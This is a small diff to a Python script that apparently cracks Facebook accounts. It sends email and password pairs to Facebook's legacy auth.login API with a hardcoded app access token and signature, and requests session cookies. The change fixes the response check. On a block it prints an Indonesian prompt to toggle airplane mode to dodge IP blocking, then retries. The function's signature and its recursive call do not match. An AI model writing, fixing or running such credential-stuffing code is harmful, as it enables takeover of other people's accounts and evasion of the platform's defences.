@@ -387,7 +387,7 @@ def bapi(user):
 			param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
 			api = "https://b-api.facebook.com/method/auth.login"
 			send = ses.get(api, params=param, headers=headers_) 
-			if send.json().status_code !=200:
+			if send.status_code !=200:
 				print("\r ! IP Terkena Block Hidupkan Mode Pesawat 5 Detik", sys.stdout.flush())
 				loop +=1
 				bapi(uid, pw)
